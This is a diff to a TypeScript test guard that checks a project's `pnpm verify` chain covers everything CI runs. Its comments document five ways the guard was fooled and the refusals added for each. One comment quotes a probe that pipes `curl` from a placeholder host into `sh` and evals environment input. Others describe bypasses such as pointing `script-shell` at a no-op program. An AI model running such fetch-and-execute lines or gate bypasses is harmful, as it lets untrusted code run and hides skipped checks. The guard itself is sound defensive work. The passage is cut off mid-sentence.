@@ -21,7 +21,7 @@
  * ## The question this file has to answer, and the times it asked a narrower one
  *
  * The wide question is **"what can make `pnpm verify` weaker than CI while every
- * string this file looks for is still present?"** Sixteen defects over five
+ * string this file looks for is still present?"** Twenty-one defects over six
  * rounds each answered a narrower one, and each fix shipped the same defect with
  * a smaller mouth:
  *
@@ -239,8 +239,14 @@
  * test:harness"` spliced into the chain put `{command: 'pnpm test:harness',
  * gating: true}` into {@link VERIFY_CHAIN} and satisfied the row. In every
  * shell `pnpm test:click-harness` succeeds, so the harness gate — which CI runs
- * in three places and wraps in a crash-retry — never executed. **141/141
- * green.** The mirror is the whole finding: the same two commands with the gate
+ * in two places, once wrapped in a crash-retry — never executed. **141/141
+ * green.** (Two, not three: `ci.yml`'s `test-ts` runs `pnpm test:harness` and
+ * `test-windows` runs `node scripts/ci-retry-vitest-crash.mjs pnpm
+ * test:harness`. Measured by filtering {@link COMMANDS} for the string, which
+ * returns those two entries and no third; `test:harness` occurs on a third line
+ * of `ci.yml` and that one is inside a comment. An earlier version of this
+ * sentence said three, which also contradicted *the crash-retry wrapper is
+ * confined to the one job that needs it* below.) The mirror is the whole finding: the same two commands with the gate
  * moved to the *left* of the same `||` was `2 failed | 139 passed`. One
  * referent, two positions across one operator, opposite verdicts — and the
  * position the file **admitted** is the one where the gate does not run, while
@@ -282,10 +288,12 @@
  *
  * The fix is not a list of control-flow builtins, because that is a list of
  * spellings and this file has lost to one of those every round. It is
- * {@link VERIFY_PROGRAMS}: the verify chain gets the totality the workflow
- * always had, every command's program must be one this reader has been told
- * runs and returns, and a program nobody listed is refused by name exactly as
- * an unknown step key is.
+ * {@link VERIFY_INVOCATIONS}: the verify chain gets the totality the workflow
+ * always had, every command must be one this reader has been told runs and
+ * returns, and an invocation nobody listed is refused by name exactly as an
+ * unknown step key is. Round three wrote that list as seven program NAMES,
+ * which is defect eighteen below; it is a list of programs *and argument
+ * shapes* now.
  *
  * ### Defect fourteen: a boolean decided by five bytes instead of by the schema
  *
@@ -362,6 +370,134 @@
  * input and any `with:` whose target this reader has not read. `secrets:` was
  * the third key listed as known and read nowhere, and it is refused by name.
  *
+ * ## Defects seventeen to twenty-one: a totality owed over an invocation
+ *
+ * Measured on the tree carrying the fixes for twelve to sixteen, each
+ * construction twice, each `172 passed (172)` with exit 0 twice — that file's
+ * whole suite at that commit, which is not a claim about the repository's.
+ *
+ * Round three gave the verify side the totality it deliberately lacked and
+ * described it, in the doc of the seven-name list this round replaced, as a
+ * model of EXECUTION: each entry was said to name the fact that "this program
+ * runs, returns an exit status, and hands control on, **and what it runs is
+ * written in this repository**". What it built was a classifier for the **first
+ * token of each simple command**. A command's effect is decided by four things —
+ * which shell reads the body, which manifest a script name binds to, which other
+ * bodies the package manager runs unasked, and what the arguments do — and the
+ * net checked one of them. All four verify-side defects below are the same
+ * substitution this file has made every round: a *textual* question asked where
+ * a *referential* one was owed. The fifth is on the workflow side, on the key
+ * next door to the one round three had just pinned.
+ *
+ * ### Defect seventeen: the lifecycle graph rides in on the setup exemption
+ *
+ * {@link SETUP_COMMANDS} exempts `pnpm install --frozen-lockfile` — the one
+ * command CI runs in three jobs and `pnpm verify` runs in none — and justified
+ * it by saying setup commands "fetch or install something and **cannot fail on
+ * the state of the tree**". `pnpm install` also runs the root package's
+ * `preinstall`, `install`, `postinstall` and `prepare`, and {@link chainOf}
+ * starts at `verify` and has no notion of a lifecycle edge. One key added to
+ * `package.json` — `"postinstall": "node scripts/run-bash.mjs
+ * scripts/probe-postinstall-gate.sh"` — with `ci.yml` byte-identical, was
+ * **172/172 green**, twice, while the byte-identical command written as an
+ * ordinary step in `static` was `1 failed | 171 passed (172)`, exit 1 twice, at
+ * *every gate command in the workflows is accounted for above* ("a new CI
+ * command appeared"). Same command, same repository, verdict decided by which
+ * key it sits under. This is not the direction the file was built for: it is CI
+ * getting *wider* through a channel this file exempted by name.
+ *
+ * The exemption's stated justification was also measurably false. In a scratch
+ * package on pnpm 10.33.0, a root `postinstall` exiting 1 made `pnpm install
+ * --frozen-lockfile` print ` ELIFECYCLE  Command failed with exit code 1.` and
+ * exit 1; with both bodies succeeding, the same install ran `postinstall` then
+ * `prepare` and exited 0 while `pnpm verify` in that package ran neither. So the
+ * exemption is conditional on a fact now rather than on a sentence: see
+ * {@link LIFECYCLE_SCRIPTS}, and *the setup exemption for "pnpm install" covers
+ * no work of its own*.
+ *
+ * ### Defect eighteen: the allowlist was a program-token test
+ *
+ * The old list named what it existed to refuse — a program that "runs text that
+ * is not in this file (`eval`, `source`, `.`, `sh`, `bash`, `cmd`)" — and then
+ * filtered on `command.program` alone, which is the first token. Prefixing the
+ * shipped chain with
+ *
+ *     pnpm exec sh -c "curl -s http://example.invalid/gate.sh | sh" &&
+ *       node -e "eval(process.env.PROBE||'')" &&
+ *
+ * was **172/172 green**, twice: both programs are on the list, so `sh`, `eval`,
+ * a pipe into `sh` and code taken from the environment were all in the chain,
+ * all parsed, all gating and reached. The mirror is the finding — the same text
+ * with `sh` in the program position was `1 failed | 171 passed (172)`, exit 1
+ * twice, with the message that names the property being violated. One invocation, two spellings, opposite verdicts,
+ * inside the function round three added to close exactly this. On its own it
+ * does not empty `verify`, because none of these can make the parent script
+ * shell exit 0 early; what it falsifies is the fact every entry was said to
+ * name. {@link VERIFY_INVOCATIONS} is a program **and** an argument shape per
+ * entry now.
+ *
+ * ### Defect nineteen: `chainOf`'s edge was a referential claim nobody checked
+ *
+ * Every row rests on "`pnpm typecheck` runs the body of `scripts.typecheck` in
+ * the root `package.json`", and `chainOf` asserted it unconditionally — while
+ * `cd` sat on round three's allowlist, admitted with a comment conceding that it
+ * "changes what the commands after it do". A `verify` of `cd probe && pnpm
+ * typecheck && … && cd ../src-tauri && cargo build …`, beside a
+ * probe manifest whose eight scripts are `node -e ""`, was **172/172
+ * green** with `ci.yml` untouched — and every one of the eight `pnpm <name>`
+ * invocations in that chain binds to `probe`'s no-op scripts, so the only
+ * commands left doing anything are the two `cargo` gates written in `verify`'s
+ * own body. The runtime half
+ * was measured in a scratch pair of packages, outside any worktree: with a root
+ * `typecheck` printing `ROOT_TYPECHECK_RAN` and a `probe/typecheck` printing
+ * `PROBE_TYPECHECK_RAN`, `sh -c 'cd probe && pnpm typecheck'` printed
+ * `> probe@1.0.0 typecheck` and `PROBE_TYPECHECK_RAN`, and `grep -nx
+ * ROOT_TYPECHECK_RAN` exited 1 — pnpm bound the name to `probe`'s manifest, not
+ * the root's. The
+ * mirror is again the finding — keep `cd probe`, keep the identical runtime
+ * behaviour, rename one invocation to a script that exists in `probe`'s manifest
+ * and not in the root's, and it is `1 failed | 171 passed (172)`, exit 1 twice,
+ * at *verify reaches the CI gate: 'pnpm typecheck'*. One referent, two
+ * spellings, opposite verdicts. See {@link VerifyCommand.rebound}.
+ *
+ * ### Defect twenty: one `.npmrc` line hands every gate to a shell that runs nothing
+ *
+ * Defect nine made `defaults.run.shell` a refusal, with the argument that "that
+ * one changes how this reader may split a body at all". The verify side has the
+ * identical setting one document over — pnpm's `script-shell`, which lives in
+ * this repository's own tracked `.npmrc` — and had no reader for it: the token
+ * `npmrc` occurred **0 times** in this file. Appending
+ *
+ *     script-shell=C:/Program Files/Git/usr/bin/true.exe
+ *
+ * to `.npmrc`, with `package.json` and `ci.yml` byte-identical, was **172/172
+ * green**, exit 0 twice. Every `pnpm <script>` body is then handed to a program
+ * that ignores its argument and exits 0 — measured in a scratch package on pnpm
+ * 10.33.0, where `pnpm verify` printed the body and neither of its two gate
+ * lines, exit 0, against a control that printed both. The blast radius includes
+ * this guard: under that `.npmrc`, CI's `pnpm test` step also runs nothing and
+ * exits 0. A file whose top line is "`pnpm verify` must be a superset of CI"
+ * certified, at full green, a tree in which neither executes anything at all —
+ * defect six's own relationship, reached through a file rather than through a
+ * script body. {@link NPMRC_KEYS} makes that document total the way
+ * {@link TOP_LEVEL_KEYS} makes the workflow total.
+ *
+ * ### Defect twenty-one: `env:` is `with:` spelled the other way
+ *
+ * GitHub passes a `with:` input to an action as the environment variable
+ * `INPUT_<NAME>`. Defect sixteen's fix pinned five actions and the `with:` keys
+ * each may carry and called that **the** bound on what a workflow hands an
+ * admitted action; `refuseWith` read one of the two spellings.
+ * `env: INPUT_RUN_INSTALL:` on the pinned `pnpm/action-setup@v4` step of
+ * `static` was **172/172 green**, twice, while the byte-equivalent
+ * `with: run_install:` on the identical step took that file down at module load,
+ * exit 1 twice, by name. Nothing here
+ * disclosed it: `env:` appeared in three header sentences, every one of them
+ * reasoning about *command text*, and a `uses:` step has none — while `INPUT_`
+ * appeared 0 times. Whether the runner really consumes it that way is **not**
+ * established here and the refusal does not turn on it; see
+ * {@link refuseEnvOnUses}.
+ *
  * ## What the reader is now, on both sides
  *
  * Both documents are read as **structure**, and both readers are *total*: every
@@ -398,13 +534,20 @@
  *   asks for a command whose program is `pnpm` and whose script is `typecheck`
  *   — a question `echo` cannot answer however its arguments are spelled.
  * - **The verify chain is total too**, which it deliberately was not. Every
- *   command in it must invoke a program named in {@link VERIFY_PROGRAMS}, whose
- *   entries name one fact each row above assumes and none of them checked:
- *   *this program runs, returns an exit status, and hands control on*. That is
- *   defect thirteen — `exit 0 && <the whole shipped chain>` parses as thirteen
- *   real gating invocations and runs none of them. "Stricter" still means
- *   verify may run gates CI does not; it no longer means verify may run
- *   constructs this reader has never classified.
+ *   command in it must match an entry of {@link VERIFY_INVOCATIONS} — a program
+ *   **and** an argument shape — whose entries name one fact each row above
+ *   assumes and none of them checked: *this invocation runs, returns an exit
+ *   status, hands control on, and what it runs is written in this repository*.
+ *   That is defect thirteen: `exit 0 && <the whole shipped chain>` is twelve
+ *   top-level simple commands, which {@link chainOf} expands to twenty-four,
+ *   every one of them parsed, gating and reached, and it runs none of them.
+ *   (Measured on the tree this comment ships in, by handing `chainOf` the
+ *   shipped `verify` body with `exit 0 && ` in front: 24 chain entries, 24
+ *   gating, 12 top-level, 8 of those `pnpm` invocations; the unspliced chain is
+ *   23 and 11. An earlier version of this bullet said "thirteen real gating
+ *   invocations", which is not a number this tree returns.) "Stricter" still
+ *   means verify may run gates CI does not; it no longer means verify may run
+ *   invocations this reader has never classified.
  *
  * ### What this still cannot see, stated so nobody over-reads a green
  *
@@ -418,27 +561,61 @@
  *   at, or to `scripts/run-bash.mjs`, `scripts/check-transcripts.sh` or
  *   `scripts/secret-scan.sh`. The *argument list* of a gate is now pinned; the
  *   *definition* of the gate is not, and pinning it is a different guard.
- * - **`working-directory:` and `env:` on a step.** Both change what a command
- *   does without changing its text. They are read as known step keys and their
- *   values are not compared with anything. `defaults.run.working-directory` is
- *   the same, and is admitted for the same reason; `defaults.run.shell` is not,
- *   because that one changes how this reader may split a body at all — defect
- *   nine. This is the boundary to watch: it is drawn at *what changes how the
- *   reader reads*, not at *what changes what runs*, and the second of those is
- *   the wider question. A `working-directory` that moves a gate to a tree with a
- *   different `Cargo.toml` would not be seen here.
+ * - **`working-directory:` and `env:` on a `run:` step.** Both change what a
+ *   command does without changing its text. They are read as known step keys and
+ *   their values are not compared with anything. `defaults.run.working-directory`
+ *   is the same, and is admitted for the same reason; `defaults.run.shell` is
+ *   not, because that one changes how this reader may split a body at all —
+ *   defect nine. This is the boundary to watch: it is drawn at *what changes how
+ *   the reader reads*, not at *what changes what runs*, and the second of those
+ *   is the wider question. A `working-directory` that moves a gate to a tree with
+ *   a different `Cargo.toml` would not be seen here.
+ *
+ *   **`env:` on a `uses:` step is NOT in this list any more** — it is refused,
+ *   and defect twenty-one is that it sat here without ever being covered by the
+ *   sentence above. A `uses:` step has no command text, so "changes what a
+ *   command does without changing its text" was never a description of it. See
+ *   {@link refuseEnvOnUses}.
+ *
+ * - **The four things that decide what a written command does, three of which
+ *   this reader had no model of at all.** Defects seventeen to twenty are one
+ *   diagnosis: the verify side's totality was asserted over a *token* where it
+ *   was owed over an *invocation*, and an invocation has four factors. Where
+ *   each stands now, so the next round starts from the boundary rather than
+ *   from the last spelling of it:
+ *
+ *   1. *Which shell reads the body.* Refused, not modelled:
+ *      {@link NPMRC_KEYS} makes `.npmrc` total and {@link SHELL_SETTING_FILES}
+ *      pins which files may decide it. **Still unseen:** a `script-shell` set
+ *      outside this repository — a user or global `.npmrc`, or
+ *      `NPM_CONFIG_SCRIPT_SHELL` in the environment. That is not a tracked file,
+ *      so it is not a thing a review of this repository could catch, which is
+ *      the honest reason the line is drawn at the tree.
+ *   2. *Which manifest a script name binds to.* Refused once a `cd` has moved
+ *      the working directory — {@link VerifyCommand.rebound}. **Still unseen:**
+ *      what any other program in the chain does to the working directory, since
+ *      only `cd` is modelled as moving it.
+ *   3. *Which other bodies the package manager runs unasked.* The lifecycle keys
+ *      are refused outright by {@link LIFECYCLE_SCRIPTS}. **Still unseen:** a
+ *      dependency's own install scripts, which `pnpm install` also runs and
+ *      which are not in this repository.
+ *   4. *What the arguments do.* Bounded per program by
+ *      {@link VERIFY_INVOCATIONS} rather than left open. **Still unseen:** what
+ *      a script this repository owns does with the arguments it is handed —
+ *      `node scripts/run-bash.mjs X` names a program that is here and says
+ *      nothing about `X`, which is the first bullet in this list again.
  * - **`strategy:` on a job.** A matrix can multiply a job; the `run:` text it
  *   multiplies is fixed, because a `run:` carrying `${{ matrix.… }}` is refused.
  *   The multiplication itself is not modelled.
  * - **A step behind `if: false`.** The invariant is one-directional — `verify`
  *   may not be looser than CI — so a step the runner skips is not something
  *   this file objects to. Measured on the tree this comment ships in, twice:
- *   `if: false` on the `Typecheck` step of `static` is `172 passed (172)`,
+ *   `if: false` on the `Typecheck` step of `static` is `181 passed (181)`,
  *   exit 0 twice.
  *
  *   **A job removed entirely is NOT in this list, and the previous version of
  *   this bullet said it was.** Measured on this tree, twice: deleting the whole
- *   `static:` job is `2 failed | 170 passed (172)`, exit 1 twice, named *verify
+ *   `static:` job is `2 failed | 179 passed (181)`, exit 1 twice, named *verify
  *   reaches the CI gate: 'cargo fmt --all --check'* and the same for `cargo
  *   clippy`, with `this test's list is stale: no workflow under
  *   .github/workflows/ runs "cargo fmt --all --check"`. It is the rows that go
@@ -458,6 +635,14 @@
  *   with the `with:` keys listed beside it**, and it is bounded by five names
  *   rather than by a pattern. `isThirdPartyAction` still decides what reaches
  *   the pin at all, and is checked segment by segment for that reason.
+ *
+ *   **That sentence was itself the bound one round too narrow, which is defect
+ *   twenty-one.** It said `with:`, and GitHub reaches the same inputs through
+ *   `env: INPUT_<NAME>`. Both keys are refused on a `uses:` step now — the pin
+ *   for one, {@link refuseEnvOnUses} for the other — so the bound is the five
+ *   names times the inputs listed beside each, through either spelling. What
+ *   remains genuinely out of reach is what those five *do* with the inputs they
+ *   are given.
  * - **What a key that cannot carry a command does.** Every key in
  *   {@link TOP_LEVEL_KEYS}, {@link JOB_KEYS} and {@link STEP_KEYS} is now
  *   either read by something below or in this sentence. Read: `jobs`,
@@ -466,19 +651,21 @@
  *   Consumed and compared with nothing: `name`, `run-name`, `on`,
  *   `concurrency`, `permissions`, `id`, `if`, `needs`, `environment`,
  *   `outputs`, `timeout-minutes`. Each of those can only name, remove or
- *   reorder work, which is the one-directional weakening above. `env:` and
- *   `strategy:` are the two that could in principle change what a command
- *   *means*, and what bounds them is checked rather than argued: a `run:`
- *   containing `${{` is refused by {@link modelOf}, a `$` outside single quotes
- *   is refused by {@link shellCommands}, and every surviving command's text is
- *   compared with {@link CI_GATES} by **equality** — so a matrix value cannot
- *   reach a command's text at all, and any other variable reference (`%FOO%`
- *   under `cmd`, a `$` inside single quotes) makes the text differ from every
- *   listed gate and lands in `unaccounted`. What `env:` changes about a gate
+ *   reorder work, which is the one-directional weakening above. `env:` is read
+ *   on a `uses:` step, where it is refused, and consumed on a `run:` step and at
+ *   job and workflow level, where it is not. `env:` and `strategy:` are the two
+ *   that could in principle change what a `run:` command *means*, and what
+ *   bounds them there is checked rather than argued: a `run:` containing `${{`
+ *   is refused by {@link modelOf}, a `$` outside single quotes is refused by
+ *   {@link shellCommands}, and every surviving command's text is compared with
+ *   {@link CI_GATES} by **equality** — so a matrix value cannot reach a
+ *   command's text at all, and any other variable reference (`%FOO%` under
+ *   `cmd`, a `$` inside single quotes) makes the text differ from every listed
+ *   gate and lands in `unaccounted`. What `env:` changes about a `run:` gate
  *   whose text is unchanged is not seen here.
  *   `working-directory:` is the one that genuinely escapes —
  *   measured on this tree, twice: moving the Clippy step's
- *   `working-directory: src-tauri` to another tree is `172 passed (172)`, exit
+ *   `working-directory: src-tauri` to another tree is `181 passed (181)`, exit
  *   0 twice.
  *
  * ### Two claims this file does not make
@@ -491,18 +678,25 @@
  *    carrying the fix for four to six, whose full suite was 91; defect eleven on
  *    the tree carrying the fix for seven to ten, whose full suite was 117;
  *    defects twelve to sixteen and round two's two findings on the tree
- *    carrying the fix for eleven, whose full suite was 141. Every count quoted
- *    against **the tree this comment ships in** is out of 172, and every one of
- *    them was run twice with its exit code read from the log body. The counts
- *    that appear inside function doc comments and case comments below — 89/89,
- *    91/91, 115/115, 116/116, 117/117, 141/141 — each name the tree that
- *    printed them, and each was printed by the round that made that change; no
- *    later round reproduced them except the 141s, every one of which was
- *    re-run twice in this round against the round-two bytes (sha256
- *    4fde14ca3c7a8a30b010b71a36c87263c74a9c27451efebb02ddc2f893f8e3f0).
+ *    carrying the fix for eleven, whose full suite was 141; defects seventeen to
+ *    twenty-one on the tree carrying the fix for twelve to sixteen, whose full
+ *    suite was 172. Every count quoted against **the tree this comment ships
+ *    in** is out of 181, and every one of them was run twice with its exit code
+ *    read from the log body. The counts that appear inside function doc comments
+ *    and case comments below — 89/89, 91/91, 115/115, 116/116, 117/117, 141/141,
+ *    172/172 — each name the tree that printed them, and each was printed by the
+ *    round that made that change.
  *    **These are exact totals of one file's cases at one commit, not a range and
  *    not a bound** — the number moves whenever a case is added, and nothing
  *    about it is evidence for anything but the run that printed it.
+ *
+ *    Two of those series were graded and could not be reproduced from a commit,
+ *    so they are marked here rather than left to look checkable: 89, 115 and 116
+ *    are intra-round working states that were never committed, and the mutation
+ *    counts attributed to trees before the immediately preceding one were each
+ *    printed once, by the round that made the change, and not re-run since. The
+ *    counts named against **the immediately preceding tree** (172) and against
+ *    **this one** (181) were both run twice in this round.
  * 2. **Whether GitHub's own parser accepts `"run":` as a quoted mapping key was
  *    not established.** No YAML parser was run against GitHub. It does not
  *    matter here, and that is by construction rather than by luck: if GitHub
@@ -541,7 +735,7 @@
  *    which is the honest reason it was affordable to make it this way.
  */
 
-import { mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from 'node:fs';
+import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { describe, expect, it } from 'vitest';
@@ -578,6 +772,127 @@ const PACKAGE = JSON.parse(readFileSync(join(REPO_ROOT, 'package.json'), 'utf8')
   scripts: Record<string, string>;
 };
 
+/* -------------------------------------------------------------------------- */
+/* what decides how a script body is read                                     */
+/* -------------------------------------------------------------------------- */
+
+/**
+ * The tracked files that can change **which shell** pnpm hands a script body to.
+ *
+ * Pinned by name for the reason {@link WORKFLOW_FILES} is: pnpm reads settings
+ * from `.npmrc` and, since v10, from a pnpm-workspace file as well, and a
+ * setting this reader never opened is one it cannot reason about. A file in this
+ * list that is absent is fine; one that appears and is not in the list is
+ * refused.
+ *
+ * Read by {@link refuseScriptInterpretation}, and by nothing else.
+ */
+const SHELL_SETTING_FILES = ['.npmrc', 'pnpm-workspace.yaml', 'pnpm-workspace.yml'] as const;
+
+/**
+ * The `.npmrc` keys this reader knows do not change how a script body is read.
+ *
+ * The list is the point, and it is the same inversion as {@link TOP_LEVEL_KEYS}:
+ * an unrecognised key is **refused** rather than skipped, so a setting nobody
+ * thought of is a review instead of a silent green.
+ *
+ * ### Defect twenty: the verify side had no `defaults.run.shell`
+ *
+ * Defect nine is that a step-level `shell:` this reader could not split was
+ * refused by name, while the identical setting written as `defaults: run:
+ * shell:` was listed as a known key and never read — and the argument written
+ * for making that one a refusal was that "it changes how this reader may split a
+ * body at all". The verify side had exactly that hole and no reader for it at
+ * all: `shellCommands` assumes POSIX `&&`, `||`, `;` and `|` for every script
+ * body, and what actually interprets those bytes is pnpm's `script-shell`, which
+ * lives in this repository's own tracked `.npmrc`. Before this round the token
+ * `npmrc` occurred zero times in this file.
+ *
+ * Measured on the tree that shipped after round three, twice: appending one line
+ *
+ *     script-shell=C:/Program Files/Git/usr/bin/true.exe
+ *
+ * to the tracked `.npmrc` — `package.json` and `ci.yml` byte-identical — was
+ * `172 passed (172)`, exit 0. The runtime half, established in a scratch package
+ * on pnpm 10.33.0 rather than in the worktree: with a body of
+ * `node -e "console.log('GATE_A_RAN')" && node -e "console.log('GATE_B_RAN')"`,
+ * `pnpm verify` under that `.npmrc` printed the body, printed **neither** gate
+ * line (`grep -nx GATE_A_RAN` and `grep -nx GATE_B_RAN` both exit 1) and exited
+ * 0; with the `.npmrc` removed the same body printed `GATE_A_RAN` on line 5 and
+ * `GATE_B_RAN` on line 6. A guard whose top line is "`pnpm verify` must be a
+ * superset of CI" certified, at 172/172, a tree in which `pnpm verify` executes
+ * nothing — and CI's own `pnpm test` step with it, which is defect six's
+ * relationship (this file certifying the empty set) reached through a file
+ * instead of through a script body.
+ *
+ * What this reader does **not** do is decide what a shell other than the default
+ * would do with `&&`. It refuses the key, because the value it would have to
+ * reason about is a program somewhere on the machine.
+ *
+ * Read by {@link refuseScriptInterpretation}, and by nothing else.
+ */
+const NPMRC_KEYS: readonly string[] = [
+  // Neither of these two reaches a script body: they decide what the installer
+  // does with peer dependencies in the module tree.
+  'strict-peer-dependencies',
+  'auto-install-peers',
+];
+
+/**
+ * Refuse anything in this repository that decides how a script body is
+ * interpreted, and that this reader has not been taught to resolve.
+ *
+ * The verify side's counterpart to `modelOf`'s `defaults.run.shell` refusal, and
+ * written to the same rule: an allow-branch must name a fact the reader
+ * established. `script-shell` and `shell-emulator` are named in the message
+ * because they are the two keys whose whole job is this, but the branch that
+ * refuses is the *default* one — an unknown key is refused whether or not
+ * anybody has heard of it.
+ *
+ * Read at module load, and by *the shell that reads a script body is one this
+ * reader assumed*. Load-bearing, measured on the tree this comment ships in,
+ * twice each: making the unknown-key branch return instead of throw is
+ * `1 failed | 180 passed (181)`, exit 1 twice, and dropping `.npmrc` from
+ * {@link SHELL_SETTING_FILES} is the same — both at that case, because the
+ * tracked `.npmrc` carries only keys {@link NPMRC_KEYS} lists and a rule over
+ * clean input asserts nothing.
+ */
+function refuseScriptInterpretation(repoRoot: string): readonly string[] {
+  const present = SHELL_SETTING_FILES.filter((file) => existsSync(join(repoRoot, file)));
+
+  for (const file of present) {
+    if (file !== '.npmrc') {
+      throw new Error(
+        `${file} decides how pnpm reads a script body — it is where "script-shell" ` +
+          'and "shell-emulator" live in pnpm 10 — and this reader has no parser ' +
+          'for it. Every command in "pnpm verify" is split on POSIX shell ' +
+          'operators by this file, so a setting that changes the shell changes ' +
+          'what every assertion here is about.',
+      );
+    }
+    const text = readFileSync(join(repoRoot, file), 'utf8');
+    text.split(/\r?\n/u).forEach((line, at) => {
+      const trimmed = line.trim();
+      if (trimmed === '' || trimmed.startsWith('#') || trimmed.startsWith(';')) return;
+      const split = trimmed.indexOf('=');
+      const key = (split < 0 ? trimmed : trimmed.slice(0, split)).trim().toLowerCase();
+      if (NPMRC_KEYS.includes(key)) return;
+      throw new Error(
+        `${file}:${String(at + 1)} sets "${key}", which this reader has not been ` +
+          'told about. `.npmrc` is where pnpm\'s "script-shell" lives, and one ' +
+          'line there hands every command in "pnpm verify" to a program of ' +
+          "somebody's choosing — including a program that runs nothing and exits " +
+          '0, which this guard would certify at full green. Decide what the ' +
+          'setting does to a script body, then add it to NPMRC_KEYS.',
+      );
+    });
+  }
+
+  return present;
+}
+
+const SHELL_SETTINGS: readonly string[] = refuseScriptInterpretation(REPO_ROOT);
+
 /**
  * Commands CI runs that are **setup**, not gates: they fetch or install
  * something and cannot fail on the state of the tree.
@@ -595,8 +910,23 @@ const PACKAGE = JSON.parse(readFileSync(join(REPO_ROOT, 'package.json'), 'utf8')
  * can actually build the dependency graph" case below is about, and a change to
  * it deserves the two seconds it takes to read.
  *
+ * **The `pnpm install` entry's exemption is conditional, and defect seventeen is
+ * that it was not.** The sentence above used to end "and cannot fail on the
+ * state of the tree", which is false of `pnpm install` whenever the manifest
+ * declares a lifecycle script: measured in a scratch package on pnpm 10.33.0,
+ * a root `postinstall` of `node -e "console.log('POSTINSTALL_GATE_RAN');
+ * process.exit(1)"` made `pnpm install --frozen-lockfile` print
+ * `POSTINSTALL_GATE_RAN` and ` ELIFECYCLE  Command failed with exit code 1.`
+ * and exit 1. With both scripts succeeding, the same install ran `postinstall`
+ * and then `prepare` and exited 0, while `pnpm verify` in the same package ran
+ * neither and exited 0. So this exemption is only sound while the manifest
+ * carries no such body, and *the setup exemption for `pnpm install` covers no
+ * work of its own* asserts exactly that — see {@link LIFECYCLE_SCRIPTS}.
+ *
  * Read by the `unaccounted` filter in *every gate command in the workflows is
- * accounted for above*, and by nothing else.
+ * accounted for above*, and by the four `unaccounted` calls in *does not exempt
+ * a command that merely begins with a setup command*, two of which are the
+ * controls that only pass because this list is consulted.
  */
 const SETUP_COMMANDS: readonly string[] = [
   'pnpm install --frozen-lockfile',
@@ -607,47 +937,254 @@ const SETUP_COMMANDS: readonly string[] = [
 ];
 
 /**
- * The programs `pnpm verify`'s chain may invoke.
+ * The `package.json` keys **pnpm itself** runs, without any of them appearing in
+ * a command anybody wrote.
+ *
+ * Defect seventeen. {@link SETUP_COMMANDS} exempts `pnpm install
+ * --frozen-lockfile` — the one command CI runs in three jobs and `pnpm verify`
+ * runs in none — on the ground that it is not a gate. `pnpm install` also runs
+ * the root package's `preinstall`, `install`, `postinstall` and `prepare`, and
+ * {@link chainOf} starts at `verify` and has no notion of a lifecycle edge, so a
+ * body written under one of these keys is CI work reached three times per run
+ * that no `pnpm verify` ever executes. That is the guard's own opening
+ * relationship — a green local run that does not mean a green CI run — arriving
+ * through the single command this file exempts by name.
+ *
+ * Measured, so the exemption is conditional on a fact rather than on a sentence:
+ * see the paragraph in {@link SETUP_COMMANDS}.
+ *
+ * The answer here is a refusal rather than a walk. Walking these bodies into
+ * {@link VERIFY_CHAIN} would be *wrong*: they are things CI runs and `verify`
+ * does not, so treating them as part of the local gate would assert the very
+ * coverage that is missing. So the manifest must carry none of them, and adding
+ * one reddens this file until somebody decides whether the work belongs in
+ * `verify`, in a workflow step, or nowhere.
+ *
+ * Read by {@link lifecycleScriptsIn}, and by nothing else — which *the setup
+ * exemption for "pnpm install" covers no work of its own* calls three times, on
+ * the real manifest and on two hand-built ones. The two hand-built calls are why
+ * this list is not an unread write: measured on the tree this comment ships in,
+ * twice, emptying it to `[]` is `1 failed | 180 passed (181)`, exit 1 twice —
+ * against the real manifest alone it would stay green, because the real manifest
+ * declares none of these.
+ */
+const LIFECYCLE_SCRIPTS: readonly string[] = [
+  'preinstall',
+  'install',
+  'postinstall',
+  'prepare',
+  'prepublish',
+  'prepublishOnly',
+  'preprepare',
+  'postprepare',
+];
+
+/**
+ * The lifecycle bodies a manifest declares, named.
+ *
+ * A named function for the reason {@link unaccounted} is one: the real manifest
+ * declares none, so a rule written inline would only ever see input that
+ * satisfies it and could be emptied without anything noticing.
+ */
+function lifecycleScriptsIn(scripts: Record<string, string>): string[] {
+  return Object.keys(scripts).filter((name) => LIFECYCLE_SCRIPTS.includes(name));
+}
+
+/**
+ * A **path in this repository**, or `undefined`.
+ *
+ * The referential question defect eleven made {@link refuseUses} ask, asked on
+ * the verify side: not "does this argument look like a path?" but "which file
+ * does it name, and is that file here?". `normaliseUsesPath` is reused rather
+ * than re-derived, so a `..` that climbs out of the tree is `undefined` on both
+ * sides for the same reason.
+ *
+ * Read in five places: four {@link VERIFY_INVOCATIONS} predicates (`node`,
+ * `vitest`, `cd`, and `vite` through `everyArgumentIsFlagOrPath`), and the three
+ * direct calls in *accepts the argument shapes the shipped chain really uses —
+ * the control*, which are what stop the existence check from being a rule the
+ * shipped chain happens to satisfy.
+ *
+ * Load-bearing, measured on the tree this comment ships in, twice: dropping the
+ * `existsSync` so the question goes back to being about spelling is `1 failed |
+ * 180 passed (181)`, exit 1 twice, at *accepts the argument shapes the shipped
+ * chain really uses — the control*.
+ */
+function repositoryPath(argument: string): string | undefined {
+  if (argument === '' || argument.startsWith('-')) return undefined;
+  const normalised = normaliseUsesPath(argument.replace(/\\/gu, '/'));
+  if (normalised === undefined) return undefined;
+  return existsSync(join(REPO_ROOT, normalised)) ? normalised : undefined;
+}
+
+const isFlag = (argument: string): boolean => argument.startsWith('-');
+const everyArgumentIsFlagOrPath = (args: readonly string[]): boolean =>
+  args.every((argument) => isFlag(argument) || repositoryPath(argument) !== undefined);
+
+/**
+ * One shape of **invocation** `pnpm verify`'s chain may contain: a program and
+ * the argument lists this reader has been told that program's behaviour under.
  *
  * This is the verify side's {@link SETUP_COMMANDS}: the totality the workflow
  * side always had and this side deliberately did not. `unaccounted` makes the
  * workflow document total — every simple command CI runs is a listed gate or a
  * listed setup command, and anything else reddens wherever it sits. The verify
  * side had no such net, on the stated grounds that "verify may be stricter", and
- * defect thirteen is what walked through the gap: `"verify": "exit 0 && <the
- * whole shipped chain, byte for byte>"` parses as twelve real, gating `pnpm`
- * invocations in the program position, satisfies every row, runs nothing, and
- * exits 0. It was **141/141 green**, twice, on the tree that shipped after
+ * defect thirteen is what walked through the gap: prefixing `exit 0 && ` to the
+ * shipped chain byte for byte gives a `verify` body of twelve top-level simple
+ * commands — `exit 0`, eight `pnpm <script>` invocations, `cd src-tauri` and two
